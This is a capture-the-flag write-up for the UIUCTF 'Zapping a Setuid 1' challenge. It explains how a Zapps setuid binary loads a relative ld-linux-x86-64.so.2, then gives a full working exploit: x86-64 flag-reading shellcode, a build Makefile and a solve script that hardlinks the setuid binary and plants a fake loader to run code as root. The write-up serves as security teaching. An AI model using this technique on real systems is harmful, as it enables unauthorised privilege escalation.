# Zapping a Setuid 1

Categories: pwn, systems

Description:
> I was reading [how Zapps work](https://zapps.app/technology/) the other day and I thought I could [do better](https://github.com/warptools/ldshim/issues/1). However, what happens when a setuid was zapped?
>
>`$ socat file:$(tty),raw,echo=0 tcp:zapp-setuid-1.chal.uiuc.tf:1337`
>
>author: YiFei Zhu
>
>[handout](resources/handout.tar.gz) - This local handout does not contain the original kernel and disk image due to size limitations. However, it contains the instructions to build the challenge.
>
> [original handout](https://cdn.discordapp.com/attachments/1008912371881889935/1124449799819755562/handout.tar.zst) - Original handout URL as given during the CTF. Link might be dead.

**Tags:** pwn, raw shellcode binary, custom entry point (`Elf64_Ehdr->e_entry`), setuid, hardlinks

## Takeaways

* Allowing hardlinks on setuid binaries is a terrible idea.
* Creating a binary with a custom `Elf64_Ehdr->e_entry` that invokes our shellcode.
* Regular `execve("/bin/sh", ["/bin/sh", NULL], NULL)` shellcode.
  * See [shellcode-execve.S](solution/shellcode-execve.S)
* Regular `fd=open("flag.txt", O_RDONLY); read(fd, stack_buf, 0x100); write(STDOUT_FILENO, stack_buf, 0x100)` shellcode.
  * See [shellcode-flag.S](solution/shellcode-flag.S)

## Solution

[Zapps](https://zapps.app/technology/) are files that look for libraries in the relative directory where they are. This is also true for their loader (`ld-linux-x86-64.so`). One thing to notice about this challenge is that hardlinks are allowed on setuid binaries:

```bash
# File: init_chal
sysctl -w fs.protected_hardlinks=0
```

This makes us think that we should make a hardlink of a given setuid Zapp program and somehow take control of it during the loading process of the binary itself or its libraries. Here is an excerpt from the makefile, which shows how a Zapp file is compiled:

```makefile
relative/exe: exe.c tmp/strip_interp tmp/zapps-crt0.o relative/lib.so relative/ld-linux-x86-64.so.2 relative/libc.so.6 | relative
	$(CC) -o $@ $< -L relative -l:lib.so -Wl,-rpath=XORIGIN -Wl,-e_zapps_start -Wl,--unique=.text.zapps tmp/zapps-crt0.o $(CFLAGS)
	sed -i '0,/XORIGIN/{s/XORIGIN/$$ORIGIN/}' $@
	tmp/strip_interp $@
```

Notice that it has a custom entry point defined to `_zapps_start`. So, when a Zapp program is loaded by the default ELF loader (`/lib/ld-musl-x86_64.so.1` in this challenge), the `_zapps_start` is executed. The relevant source code of this function is shown below:

```c
__asm__ (
    ".globl _zapps_start\n"
    ".section .text.zapps,\"ax\",@progbits\n"
    ".type _zapps_start, @function\n"
    "_zapps_start:\n"
    "    mov %rsp, %rdi\n"
    "    call _zapps_main\n"
    "\n"
    "/* clean registers in case some libc might assume 0 initialized */\n"
    "    xor %ebx, %ebx\n"
    "    xor %ecx, %ecx\n"
    "    xor %edx, %edx\n"
    "    xor %ebp, %ebp\n"
    "    xor %ebp, %ebp\n"
    "    xor %esi, %esi\n"
    "    xor %edi, %edi\n"
    "    xor %r8, %r8\n"
    "    xor %r9, %r9\n"
    "    xor %r10, %r10\n"
    "    xor %r11, %r11\n"
    "    xor %r12, %r12\n"
    "    xor %r13, %r13\n"
    "    xor %r14, %r14\n"
    "    xor %r15, %r15\n"
    "\n"
    "/* jmp into ld.so entry point */\n"
    "    cld\n"
    "    /* jmp *%rax */\n"
    "    push %rax\n"
    "    xor %eax, %eax\n"
    "    ret\n"
);
```

As we can see, it is written in assembly. It invokes `_zapps_main`, clears the registers, and then jumps to the return value of `_zapps_main`. So, let's examine this `_zapps_main` function:

```c
__section_zapps
void *_zapps_main(void **stack)
{
    char ld_rel[] = "/ld-linux-x86-64.so.2";
    Elf64_Phdr *self_phdr, *self_phdr_end;
    Elf64_Word p_type_interp = PT_INTERP;
    uintptr_t page_filesz, page_memsz;
    ssize_t exe_path_len;
    char ld[PATH_MAX+1];
    size_t max_map = 0;
    void *ld_base_addr;
    unsigned long argc;
    Elf64_auxv_t *auxv;
    Elf64_Ehdr ld_ehdr;
    Elf64_Phdr ld_phdr;
    int ld_fd, mem_fd;
    unsigned int i;
    void *ptr;
    int prot;

    argc = (uintptr_t)*stack++;
    /* argv */
    for (i = 0; i < argc; i++)
        stack++;
    stack++;

    /* envp */
    while (*stack++);

    auxv = (void *)stack;

    exe_path_len = _zapps_sys_readlink((char []){"/proc/self/exe"}, ld, PATH_MAX);
    if (exe_path_len < 0 || exe_path_len >= PATH_MAX)
        _zapps_die("Zapps: Fatal: failed to readlink /proc/self/exe\n");

    ld[exe_path_len] = '\0';
    *_zapps_strrchr(ld, '/') = '\0'; //return the ptr to the last occurrence of '/'
    _zapps_strncat(ld, ld_rel, sizeof(ld) - 1);

    ld_fd = _zapps_sys_open(ld, O_RDONLY | O_CLOEXEC);
    if (ld_fd < 0)
        _zapps_die("Zapps: Fatal: failed to open ld.so\n");

    if (_zapps_sys_read(ld_fd, &ld_ehdr, sizeof(ld_ehdr)) != sizeof(ld_ehdr))
        _zapps_die("Zapps: Fatal: failed to read EHDR from ld.so\n");

    if (_zapps_sys_lseek(ld_fd, ld_ehdr.e_phoff, SEEK_SET) != ld_ehdr.e_phoff)
        _zapps_die("Zapps: Fatal: failed to seek to PHDR in ld.so\n");
    for (i = 0; i < ld_ehdr.e_phnum; i++) {
        if (_zapps_sys_read(ld_fd, &ld_phdr, sizeof(ld_phdr)) != sizeof(ld_phdr))
            _zapps_die("Zapps: Fatal: failed to read PHDR from ld.so\n");

        if (ld_phdr.p_type != PT_LOAD)
            continue;

        if (max_map < ld_phdr.p_vaddr + ld_phdr.p_memsz)
            max_map = ld_phdr.p_vaddr + ld_phdr.p_memsz;
    }

    ld_base_addr = _zapps_sys_mmap(NULL, max_map, PROT_NONE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (IS_ERR(ld_base_addr))
        _zapps_die("Zapps: Fatal: failed to reserve memory for ld.so\n");

    if (_zapps_sys_lseek(ld_fd, ld_ehdr.e_phoff, SEEK_SET) != ld_ehdr.e_phoff)
        _zapps_die("Zapps: Fatal: failed to seek to PHDR in ld.so\n");
    for (i = 0; i < ld_ehdr.e_phnum; i++) {
        if (_zapps_sys_read(ld_fd, &ld_phdr, sizeof(ld_phdr)) != sizeof(ld_phdr))
            _zapps_die("Zapps: Fatal: failed to read PHDR from ld.so\n");

        if (ld_phdr.p_type != PT_LOAD)
            continue;

        prot = (ld_phdr.p_flags & PF_R ? PROT_READ : 0) |
           (ld_phdr.p_flags & PF_W ? PROT_WRITE : 0) |
           (ld_phdr.p_flags & PF_X ? PROT_EXEC : 0);

        if (IS_ERR(_zapps_sys_mmap(
            (void *)PAGE_DOWN((uintptr_t)ld_base_addr + ld_phdr.p_vaddr),
            ld_phdr.p_filesz + PAGE_OFF(ld_phdr.p_vaddr),
            prot, MAP_PRIVATE | MAP_FIXED, ld_fd,
            ld_phdr.p_offset - PAGE_OFF(ld_phdr.p_vaddr))
        ))
            _zapps_die("Zapps: Fatal: failed to map ld.so\n");

        if (ld_phdr.p_filesz >= ld_phdr.p_memsz)
            continue;

        /* BSS stage 1: clear memory after filesz */
        ptr = ld_base_addr + ld_phdr.p_vaddr + ld_phdr.p_filesz;
        _zapps_memset(ptr, 0, PAGE_UP((uintptr_t)ptr) - (uintptr_t)ptr);

        page_filesz = PAGE_UP((uintptr_t)ptr);
        page_memsz = PAGE_UP((uintptr_t)ld_base_addr + ld_phdr.p_vaddr +
                             ld_phdr.p_memsz);
        if (page_filesz >= page_memsz)
            continue;

        /* BSS stage 2: map anon pages after last filesz page */
        if (IS_ERR(_zapps_sys_mmap(
            (void *)page_filesz, page_memsz - page_filesz,
            prot, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0)
        ))
            _zapps_die("Zapps: Fatal: failed to map BSS in ld.so\n");
    }

    _zapps_sys_close(ld_fd);

    *_zapps_getauxval_ptr(auxv, AT_BASE) = (uintptr_t)ld_base_addr;
    *_zapps_getauxval_ptr(auxv, AT_ENTRY) = (uintptr_t)&_start;

    /* Patch our own PHDR for so PT_ZAPPS_INTERP is back to PT_INTERP.
       Without this glibc ld.so complains:
       Inconsistency detected by ld.so: rtld.c: 1291: rtld_setup_main_map:
       Assertion `GL(dl_rtld_map).l_libname' failed! */
    self_phdr = (void *)*_zapps_getauxval_ptr(auxv, AT_PHDR);
    self_phdr_end = self_phdr + *_zapps_getauxval_ptr(auxv, AT_PHNUM);

    mem_fd = _zapps_sys_open((char []){"/proc/self/mem"}, O_RDWR | O_CLOEXEC);
    if (mem_fd < 0)
        _zapps_die("Zapps: Fatal: failed to open /proc/self/mem\n");

    for (; self_phdr < self_phdr_end; self_phdr++) {
        if (self_phdr->p_type != PT_ZAPPS_INTERP)
            continue;

        _zapps_sys_pwrite64(mem_fd, &p_type_interp, sizeof(p_type_interp), (uintptr_t)&self_phdr->p_type);
    }

    _zapps_sys_close(mem_fd);

    return ld_base_addr + ld_ehdr.e_entry;
}
```

Aha. The `_zapps_main` is nothing more than another loader. It basically finds the `ld-linux-x86-64.so.2` binary relative the the Zapp program (`readlink((char []){"/proc/self/exe"}`), opens it, mmaps its **program headers** into memory with the appropriate permissions, deals with the stack, argv, envp, and auxv, changes something in memory with `_zapps_sys_pwrite64`, and then finally returns the ELF entry point of the loader.

So, when a Zapp program is executed, the system loader (`/lib/ld-musl-x86_64.so.1`) will jump to `_zapps_start`, which in turn will open the relative loader `ld-linux-x86-64.so.2` to the Zapp program, and jump in turn to the entry point of the relative `ld-linux-x86-64.so.2`. **Note that all of this happens inside the memory space of the Zapp program**.

In our machine we have a **setuid** Zapp program called `exe` and we also can make hardlinks to setuid programs (`sysctl -w fs.protected_hardlinks=0`). So, we will create a copy of `exe` in our writeable directory via a hardlink. This will preserve the setuid bit. Next, we can create a regular ELF binary which will play the role of a malicious relative `ld-linux-x86-64.so.2`. Instead of being an actual loader, our binary will print the flag (or pop a shell). Our malicious loader will be executed with the permissions of the setuid binary, i.e. `root` in this case. So, here is our exploit:

```makefile
# File: Makefile
CC=gcc
CFLAGS=-g -Os -fPIE

all: exploit.b64

# base64 encoded exploit for easy copy-paster transfer
exploit.b64: exploit
	cat $< | base64 -w 0 > $@

# Define custom Elf64_Ehdr->e_entry to be `mymain` function
exploit: shellcode.o exploit.o
	$(CC) $(CFLAGS) -Wl,-emymain -nostartfiles -o $@ $^

shellcode.o: shellcode-flag.S
	$(CC) $(CFLAGS) -c -o $@ $<
exploit.o: exploit.c
	$(CC) $(CFLAGS) -c -o $@ $<

clean:
	rm -rf *.o exploit exploit.b64
```

```c
// File: exploit.c
extern void shellcode();
int mymain() {
    shellcode();
    return 0;
}
```

```asm
/* File: shellcode-flag.S */
.intel_syntax noprefix
.text
.global shellcode

shellcode:
/* open */
lea rbx, [rip+flag]
mov     rdi, rbx
xor     rsi, rsi
xor     rdx, rdx
mov     eax, 2
syscall

/* read */
sub rsp, 0x100
push rax
mov rdi, rax
lea rbx, [rsp+0x8]
mov     rsi, rbx
mov     rdx, 0x100
mov eax, 0
syscall

/* write */
pop rax
mov rdi, 1
lea rbx, [rsp]
mov     rsi, rbx
mov     rdx, 0x100
mov eax, 1
syscall

ud2

/************* Fake data section *************/
/* we just want these read-only data to be near our pie code. Similar to arm64 :) */
flag:                                 
.ascii "/mnt/flag\0"
```

And here is our script that executes our exploit:

```bash
#!/bin/sh
# File: solve.sh
make
chmod ugo+x exploit
ln /usr/lib/zapps/build/exe exe # hardlink, which should preserve setuid and root owner
cp /usr/lib/zapps/build/lib.so .
cp /usr/lib/zapps/build/libc.so.6 .
ln -s exploit ld-linux-x86-64.so.2
./exe
```

And we get the flag!

`uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}`
